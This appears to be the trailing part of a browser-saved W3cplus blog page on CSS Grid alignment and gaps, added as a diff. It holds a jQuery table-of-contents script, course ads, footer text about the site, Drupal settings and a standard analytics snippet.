+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">网格布局中的对齐</a></li><li> <ul class="mb-2"><li><a data-index="1" href="javascript:;">网格布局中的轴线</a></li><li><a data-index="2" href="javascript:;">网格布局中的对齐方式</a></li><li> <ul class="mb-2"><li><a data-index="3" href="javascript:;">网格项目的对齐</a></li><li><a data-index="4" href="javascript:;">网格轨道的对齐</a></li></ul></li><li><a data-index="5" href="javascript:;">对齐和自动外边距</a></li></ul></li><li><a data-index="6" href="javascript:;">网格布局中的间距</a></li><li><a data-index="7" href="javascript:;">小结</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"hJ6Bd88wMtyf004yC-VHprJ5bDAC2AirVm6En-AxzKc","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2725"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/grid-layout-part-12.html?expire=1699863107\u0026code=GsOhRzlRnIU\u0026sign=de3acde2366c895e767c8e794c770118":true}});
+//--><!]]>
+</script>
+<script src="./Grid布局：12-网格布局中的对齐方式和间距_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="f9d4e"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
